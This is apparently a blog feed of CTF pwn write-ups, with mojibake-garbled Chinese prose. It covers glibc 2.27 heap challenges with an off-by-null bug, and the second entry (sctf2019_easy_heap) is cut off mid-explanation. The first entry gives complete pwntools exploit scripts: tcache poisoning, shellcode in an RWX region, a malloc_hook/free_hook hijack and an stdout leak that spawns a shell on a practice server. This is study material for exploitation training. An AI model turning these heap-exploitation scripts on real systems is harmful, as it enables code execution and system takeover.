        <content type="html"><![CDATA[<h2 id="ä¿æŠ¤ç­–ç•¥ï¼š"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h2><p><img src="/../img/2706180-20220827143912772-1288382840.png"></p><h2 id="æ¼æ´æ‰€åœ¨ï¼š"><a href="#æ¼æ´æ‰€åœ¨ï¼š" class="headerlink" title="æ¼æ´æ‰€åœ¨ï¼š"></a>æ¼æ´æ‰€åœ¨ï¼š</h2><p>åœ¨editå‡½æ•°ä¸­çš„è¾“å…¥å‡½æ•°å†…ï¼Œå­˜åœ¨ä¸€ä¸ªoff by nullçš„æ¼æ´ã€‚(å¦‚ä¸‹å›¾)</p><p><img src="/../img/2706180-20220827144620544-33395681.png"></p><p>ç„¶ååœ¨ç¨‹åºçš„å¼€å§‹éƒ¨åˆ†ï¼Œä½¿ç”¨mmapå‡½æ•°æ˜ å°„äº†ä¸€æ®µå¯è¯»å¯å†™å¯æ‰§è¡Œçš„å†…å­˜åŒºå‡ºæ¥ï¼Œå¹¶å°†è¯¥åœ°å€æ‰“å°äº†å‡ºæ¥ã€‚</p><p><img src="/../img/2706180-20220827144132190-233381137.png"></p><h2 id="åˆ©ç”¨æ€è·¯ï¼š"><a href="#åˆ©ç”¨æ€è·¯ï¼š" class="headerlink" title="åˆ©ç”¨æ€è·¯ï¼š"></a>åˆ©ç”¨æ€è·¯ï¼š</h2><p>è¿™é¢˜çš„libcç‰ˆæœ¬æ˜¯2.27ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨off by nullæ‰“ä¸€ä¸ªtcache dupã€‚ä½†éš¾ç‚¹åœ¨äºæ²¡æœ‰showå‡½æ•°ï¼Œä¸”å¼€äº†FULL RELROä¿æŠ¤ã€‚é€šå¸¸æˆ‘ä»¬é‡‡å–çš„æªæ–½æ˜¯io leakï¼Œè¿™å±äºå¸¸è§„åšæ³•ï¼Œä½†æ˜¯è¿™é“é¢˜è¿˜ç»™äº†ä¸€ç‰‡å¯è¯»å¯å†™å¯æ‰§è¡Œçš„åŒºåŸŸï¼Œå› æ­¤å¦‚æœæˆ‘ä»¬èƒ½åœ¨è¿™ä¸ªåŒºåŸŸå†™å…¥shellcodeï¼Œå¹¶æœ€ååŠ«æŒmalloc_hookä¸ºè¿™ä¸ªåœ°å€ä¹Ÿæ˜¯å¯ä»¥æ‹¿åˆ°shellçš„è€Œä¸”å…¨ç¨‹ä¸éœ€è¦æ³„éœ²åœ°å€ã€‚</p><p>å› æ­¤è¿™é“é¢˜æœ‰ä¸¤ç§åšæ³•ï¼Œæˆ‘éƒ½åˆ†åˆ«è®°å½•ä¸€ä¸‹ã€‚</p><p>å…ˆè¯´å…¨ç¨‹ä¸æ³„éœ²libcåœ°å€çš„è¿™ä¸ªæ–¹æ³•ã€‚</p><h3 id="æ–¹æ³•ä¸€ï¼š"><a href="#æ–¹æ³•ä¸€ï¼š" class="headerlink" title="æ–¹æ³•ä¸€ï¼š"></a>æ–¹æ³•ä¸€ï¼š</h3><p>å…ˆåˆ©ç”¨off by nullæ¼æ´åšä¸€ä¸ªå †å—é‡å ï¼Œç„¶åæ‰“tcache dupï¼Œæ­¤æ—¶å°±å¯ä»¥å†æ‰“tcache poisoningäº†ï¼Œç”±äºæˆ‘ä»¬çŸ¥é“é‚£ç‰‡å¯è¯»å¯å†™å¯æ‰§è¡Œçš„å†…å­˜åœ°å€ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥å°†å…¶ç”³è¯·å‡ºæ¥ï¼Œå†™å…¥shellcodeã€‚ï¼ˆæˆ‘è¿™é‡Œæ˜¯æå‰å‡†å¤‡äº†ä¸¤ç»„tcache dupï¼‰</p><p>è¿™éƒ¨åˆ†çš„expä¸ºï¼š</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&#x27;Mmap: &#x27;</span>)</span><br><span class="line">leak_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;leak_addr&#x27;</span>)</span><br><span class="line">add(<span class="number">0x4f0</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x28</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x48</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x4f0</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0x580</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4f0</span>)</span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">0x48</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#two groups of tcache dup</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(leak_addr)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,shellcode_store(<span class="string">&#x27;shell_64&#x27;</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬è¦å°†malloc_hookç»™ç”³è¯·å‡ºæ¥å†™å…¥shellcodeçš„åœ°å€ï¼Œè¿™é‡Œæˆ‘ä»¬é‡‡ç”¨çš„æ–¹æ³•æ˜¯æ‰“ä¸€ä¸ªoff by nullåšä¸€ä¸ªå †å—é‡å ï¼Œå°±æ˜¯è®©ä¸¤ä¸ªè¦åˆå¹¶çš„å †å—ä¸­é—´å¤¹æ‚ä¸€ä¸ªè¢«é‡Šæ”¾æ‰ä¸”ä½äºtcachebinä¸­çš„å †å—ï¼Œå½“ä¸¤ä¸ªå †å—åˆå¹¶åï¼Œæˆ‘ä»¬æ§åˆ¶ä¸€ä¸‹ç”³è¯·å‡ºæ¥çš„å†…å­˜ï¼Œè®©unsorted binçš„fdæŒ‡é’ˆè½åœ¨tcachebinçš„fdæŒ‡é’ˆä¸Šå³å¯ã€‚(ä¸‹é¢ä¸¤å¼ å›¾ç‰‡ä¸ºç”³è¯·å‰åçš„æƒ…å†µ)</p><p><img src="/../img/2706180-20220827144207436-1577307073.png"></p><p><img src="/../img/2706180-20220827144219767-514005889.png"></p><p>ç„¶åæˆ‘ä»¬ä¿®æ”¹å…¶main_arena+88æœ€åä¸€ä¸ªå­—èŠ‚ä¸º0x30ï¼Œå³å¯å°†å…¶æ”¹ä¸ºmalloc_hookçš„åœ°å€ã€‚ç„¶åæŠŠmalloc_hookç”³è¯·å‡ºæ¥å†™å…¥shellcodeçš„åœ°å€</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h3><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">toolsæºç </a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26270</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">d_d=<span class="number">0xc91</span></span><br><span class="line">d_a=<span class="number">0xc85</span></span><br><span class="line">d_e=<span class="number">0xc9d</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Pointer Address &#x27;</span>)</span><br><span class="line">    addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Content: &#x27;</span>,content)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Mmap: &#x27;</span>)</span><br><span class="line">leak_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;leak_addr&#x27;</span>)</span><br><span class="line">add(<span class="number">0x4f0</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x28</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x48</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x4f0</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0x580</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4f0</span>)</span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">0x48</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#two groups of tcacheb dup</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(leak_addr)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,shellcode_store(<span class="string">&#x27;shell_64&#x27;</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,d_d,d_a,d_e)</span></span><br><span class="line">add(<span class="number">0x48</span>)</span><br><span class="line">add(<span class="number">0x4f0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0x580</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x520</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="string">b&#x27;\x30&#x27;</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">edit(<span class="number">7</span>,p64(leak_addr)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/../img/2706180-20220827144407358-1671954256.png"></p><h3 id="æ–¹æ³•äºŒï¼š"><a href="#æ–¹æ³•äºŒï¼š" class="headerlink" title="æ–¹æ³•äºŒï¼š"></a>æ–¹æ³•äºŒï¼š</h3><p>è¿™ä¸ªæ–¹æ³•å°±æ˜¯å¸¸è§„çš„æ‰“io leakã€‚å…ˆæ˜¯ç”¨off by nullåšä¸€ä¸ªå †å—é‡å ï¼Œè®©ä¸¤ä¸ªå¤§å †å—åˆå¹¶çš„æ—¶å€™ï¼Œä¸­é—´åŒ…å«ä¸€ä¸ªè¿›å…¥tcachebinçš„å †å—ï¼Œç„¶åç”³è¯·ä¸€å®šå­—èŠ‚çš„å †å—å°†unsorted binçš„fdæŒ‡é’ˆè½åœ¨tcachebinçš„fdæŒ‡é’ˆä¸Šï¼Œç„¶åè¿›è¡Œçˆ†ç ´ä¸€æ¯”ç‰¹ç¯¡æ”¹ä¸ºstdoutç»“æ„ä½“åœ°å€ï¼Œå¾€stdoutç»“æ„ä½“ä¸­å†™å…¥æ•°æ®ç¯¡æ”¹ä¸€äº›å­—æ®µï¼Œç„¶åæ³„éœ²libcåœ°å€ã€‚å†æ‰“ä¸€æ¬¡tcache dup+tcache poisoningç¯¡æ”¹free_hookå†™å…¥systemåœ°å€ï¼Œæœ€ç»ˆæ‹¿åˆ°shellã€‚</p><p>å°±ä¸æ”¾å…·ä½“è°ƒè¯•çš„å›¾ç‰‡äº†ï¼Œç›´æ¥æ”¾ä¸‹expã€‚</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29725</span>)</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">d_d=<span class="number">0xc91</span></span><br><span class="line">d_a=<span class="number">0xc85</span></span><br><span class="line">d_e=<span class="number">0xc9d</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Pointer Address &#x27;</span>)</span><br><span class="line">    addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Content: &#x27;</span>,content)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Mmap: &#x27;</span>)</span><br><span class="line">    leak_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">    log_addr(<span class="string">&#x27;leak_addr&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x4f0</span>)<span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x28</span>)<span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0x48</span>)<span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x4f0</span>)<span class="comment">#3</span></span><br><span class="line">    add(<span class="number">0x20</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">2</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0x580</span>))</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x4f0</span>)</span><br><span class="line">    add(<span class="number">0x28</span>)</span><br><span class="line">    add(<span class="number">0x48</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#two groups of tcache dup</span></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x48</span>)</span><br><span class="line">    add(<span class="number">0x4f0</span>)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0x580</span>))</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x520</span>)</span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">b&#x27;\x60\x97&#x27;</span>+<span class="string">b&#x27;\n&#x27;</span>)<span class="comment">#\x60\x97  \x60\x07\xdd</span></span><br><span class="line">    add(<span class="number">0x48</span>)</span><br><span class="line">    add(<span class="number">0x48</span>)</span><br><span class="line">    edit(<span class="number">3</span>,p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    leak_libc=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log_addr(<span class="string">&#x27;leak_libc&#x27;</span>)</span><br><span class="line">    libc_base=leak_libc-<span class="number">0x3ed8b0</span></span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    add(<span class="number">0x20</span>)</span><br><span class="line">    edit(<span class="number">5</span>,p64(free_hook)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="comment">#debug(p,&#x27;pie&#x27;,d_d,d_a,d_e)</span></span><br><span class="line">    add(<span class="number">0x20</span>)</span><br><span class="line">    edit(<span class="number">6</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x20</span>)</span><br><span class="line">    edit(<span class="number">7</span>,p64(sys_addr)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    delete(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29725</span>)</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line"></span><br><span class="line"> </span><br></pre></td></tr></table></figure><p><img src="/../img/2706180-20220827144429293-294878212.png"></p>]]></content>
      
      
      <categories>
          
          <category> buuåˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> off_by_null </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sctf2019_easy_heap</title>
      <link href="/posts/b5a0cf5.html"/>
      <url>/posts/b5a0cf5.html</url>
      
        <content type="html"><![CDATA[<h3 id="ä¿æŠ¤ç­–ç•¥ï¼š"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h3><p><img src="/../img/2706180-20221004174330248-2145656851.png"></p><h3 id="æ¼æ´æ‰€åœ¨ï¼š"><a href="#æ¼æ´æ‰€åœ¨ï¼š" class="headerlink" title="æ¼æ´æ‰€åœ¨ï¼š"></a>æ¼æ´æ‰€åœ¨ï¼š</h3><p><img src="/../img/2706180-20221004174342408-238813370.png"></p><p>åœ¨inputå‡½æ•°ä¸­ï¼Œå­˜åœ¨ä¸€ä¸ªoff by nullæ¼æ´ã€‚</p><p>å¹¶ä¸”ç¨‹åºæ‰§è¡Œmmapæ¥æ˜ å°„äº†ä¸€æ®µå¯è¯»å¯å†™å¯æ‰§è¡Œçš„åœ°å€ï¼Œå¹¶ä¸”è¿˜æŠŠåœ°å€æ‰“å°äº†å‡ºæ¥ã€‚</p><p><img src="/../img/2706180-20221004174406746-192348655.png"></p><h3 id="å¤§è‡´æ€è·¯ï¼š"><a href="#å¤§è‡´æ€è·¯ï¼š" class="headerlink" title="å¤§è‡´æ€è·¯ï¼š"></a>å¤§è‡´æ€è·¯ï¼š</h3><p>é¦–å…ˆæ˜¯è¿™é“é¢˜æ˜ å°„äº†ä¸€æ®µå¯è¯»å¯å†™å¯æ‰§è¡Œçš„åŒºåŸŸï¼ŒåŒæ—¶æ²¡å¼€æ²™ç®±ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥åœ¨è¿™ä¸ªåœ°æ–¹å†™å…¥shellcodeçš„è¯ï¼Œå…¶å®æˆ‘ä»¬å†åŠ«æŒfree_hookçš„æ—¶å€™ï¼Œå°±æ²¡å¿…è¦å†™å…¥libcé‡Œçš„systemåœ°å€äº†(ç›´æ¥å†™shellcodeçš„åœ°å€å³å¯)ã€‚è€Œè¿™é“é¢˜æ²¡æœ‰showå‡½æ•°ï¼Œæ‰€ä»¥å…¶å®å¯ä»¥çŒœæµ‹è¿™é“é¢˜å‡ºé¢˜äººå¤§æ¦‚ç‡æ˜¯æ²¡æ‰“ç®—è®©æˆ‘ä»¬å»æ³„éœ²libcåœ°å€çš„(å¦‚æœæˆ‘ä»¬æ‰“io leakçš„è¯ï¼Œè‚¯å®šä¹Ÿæ˜¯å¯ä»¥æ³„éœ²çš„)ã€‚</p><p>æ‰€ä»¥è¿™é¢˜ä¸»è¦å°±æ˜¯å»å¾€mmapæ˜ å°„çš„å†…å­˜ä¸­å†™å…¥shellcodeä»¥åŠå°†free_hookç»™ç”³è¯·å‡ºæ¥ï¼Œå¾€é‡Œé¢å†™å…¥shellcodeçš„åœ°å€ã€‚</p><h4 id="å¾€mmapæ˜ å°„çš„å†…å­˜é‡Œå†™å…¥shellcode"><a href="#å¾€mmapæ˜ å°„çš„å†…å­˜é‡Œå†™å…¥shellcode" class="headerlink" title="å¾€mmapæ˜ å°„çš„å†…å­˜é‡Œå†™å…¥shellcode"></a>å¾€mmapæ˜ å°„çš„å†…å­˜é‡Œå†™å…¥shellcode</h4><p>æˆ‘ä»¬è‚¯å®šæ˜¯è¦æ‰“ä¸€ä¸ªtcache dup+tcache poisoningæ¥å°†mmapæ˜ å°„çš„å†…å­˜ç”³è¯·å‡ºæ¥ï¼Œä½†æ˜¯æ²¡æœ‰UAFæ¼æ´ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨off by nullæ¥æ‰“tcache dupçš„è¯ï¼Œç•¥å¾®æœ‰ç‚¹éº»çƒ¦ï¼Œä¸è¿‡é—®é¢˜ä¸å¤§ã€‚</p><p>é¦–å…ˆæ˜¯ç”³è¯·åä¸ªå †å—ï¼Œå†é‡Šæ”¾æ‰å…¶ä¸­çš„ä¸ƒä¸ªå¡«æ»¡tcache binã€‚(è¿˜éœ€è¦ç•™ä¸€ä¸ªé˜²æ­¢ä¸€ä¼šå †å—è¿›å…¥unsorted binä¸­å’Œtop chunkåˆå¹¶)</p><p>é™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜éœ€è¦æœ‰ä¸‰ä¸ªå †å—åˆ©ç”¨off by nullå®Œæˆå †å—åˆå¹¶ï¼Œç„¶ååšä¸€ä¸ªå †å—é‡å å‡ºæ¥ã€‚</p><p>ä¸‹å›¾ä¸ºç¼–è¾‘å‰çš„å †å—å’Œbinså¸ƒå±€</p><p><img src="/../img/2706180-20221004174429647-465687303.png"></p><p><img src="/../img/image-20221007235156247.png" alt="image-20221007235156247"></p><p>ä¸‹å›¾ä¸ºåˆå¹¶åçš„æƒ…å†µï¼š</p><p><img src="/../img/2706180-20221004174531971-356622684.png"></p><p>åšå‡ºäº†å †å—é‡å åï¼Œå› ä¸ºæ˜¯2.27çš„libcï¼Œå› æ­¤æˆ‘ä»¬ç›´æ¥æ‰“tcache dup+tcache poisoningå³å¯(ä¸è¿‡åœ¨è¿™ä¹‹å‰éœ€è¦å°†tcache binç»™æ¸…ç©º)ï¼Œå¦‚ä¸‹å›¾</p><p><img src="/../img/2706180-20221004174614156-1953839367.png"></p><p>å°†mmapæ˜ å°„å‡ºçš„å†…å­˜ç”³è¯·å‡ºæ¥ï¼Œå¦‚ä¸‹å›¾ï¼š</p><p><img src="/../img/2706180-20221004174627014-747608965.png"></p><p>ä¸‹å›¾ä¸ºshellcodeå·²ç»å†™å…¥å†…å­˜çš„æƒ…å†µï¼š</p><p><img src="/../img/2706180-20221004174649212-432128807.png"></p><h4 id="ç”³è¯·å‡ºæ¥free-hook"><a href="#ç”³è¯·å‡ºæ¥free-hook" class="headerlink" title="ç”³è¯·å‡ºæ¥free_hook"></a>ç”³è¯·å‡ºæ¥free_hook</h4><p>åœ¨ä¸çŸ¥é“libcåœ°å€çš„æƒ…å†µä¸‹ï¼ŒæŠŠfree_hookç”³è¯·å‡ºæ¥çš„è¯ï¼Œæˆ‘ä»¬åªèƒ½å»åˆ©ç”¨unsorted biné‡Œæ®‹ç•™çš„fdæŒ‡é’ˆã€‚</p><p>åœ¨å¸ƒå±€ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæŠŠä¹‹å‰ç”³è¯·å‡ºæ¥çš„chunkå…¨éƒ¨ç»™é‡Šæ”¾åˆ°unsorted binä¸­ï¼Œç„¶åç”³è¯·å‡ºæ¥(ç„¶åå°±ä¸ç®¡è¿™ç‰‡å†…å­˜äº†ï¼Œæˆ‘ä»¬é‡æ–°æ‰§è¡Œaddå‡½æ•°è¿›è¡Œæ–°çš„å¸ƒå±€)ã€‚<strong>å¹¶ä¸”éœ€è¦æ³¨æ„çš„æ˜¯ä¸Šé¢æ‰“å®Œäº†tcache dupï¼Œå°±å¯¼è‡´0x100è¿™æ¡é“¾å·²ç»åäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹‹åæ— æ³•å†ä½¿ç”¨è¿™æ¡é“¾äº†ã€‚</strong></p><p>åˆ©ç”¨æ€è·¯æ˜¯å†è¿›è¡Œä¸€æ¬¡å †å—é‡å çš„å¸ƒå±€ï¼Œç„¶åè¿™æ¬¡ä¸æ‰“tcache dupï¼Œç›´æ¥å…ˆå°†spy chunk(å †å—é‡å çš„é‚£ä¸ªchunk)é‡Šæ”¾æ‰ï¼Œç„¶åè®©unsorted binçš„fdæŒ‡é’ˆè½åœ¨spy chunkä¸Šï¼Œè¿™æ ·tcache biné“¾ä¸Šå°±å‡ºç°äº†libcåœ°å€ã€‚ç„¶åå°†spy chunkçš„å†…å­˜ç”³è¯·å‡ºæ¥(å› ä¸ºæˆ‘ä»¬é€ æˆäº†å †å—é‡å ï¼Œæ‰€ä»¥å³å¯ä»¥è®©spy chunkå¤„äºtcacheé“¾ä¸Šï¼ŒåŒæ—¶è¿˜èƒ½æŠŠå®ƒç”³è¯·å‡ºæ¥è¿›è¡Œç¼–è¾‘)å»æ§åˆ¶tcacheé“¾ä¸Šçš„fdæŒ‡é’ˆï¼Œå°†main_arena+88çš„åœ°å€ä¿®æ”¹ä¸ºfree_hookçš„åœ°å€(éœ€è¦çˆ†ç ´åŠä¸ªå­—èŠ‚)å†ç”³è¯·å‡ºæ¥å³å¯ã€‚</p><p>æœ€åˆæˆ‘ä»¬çš„å¸ƒå±€æ˜¯è¿™æ ·ï¼š</p><p><img src="/../img/2706180-20221004174716803-333842617.png"></p><p>åˆ©ç”¨off by nullå¦‚ä¸‹ï¼š</p><p><img src="/../img/image-20221007235233295.png" alt="image-20221007235233295"></p><p>è¿›è¡Œåˆå¹¶ä¹‹åå¦‚ä¸‹ï¼š</p><p><img src="/../img/image-20221007235245651.png" 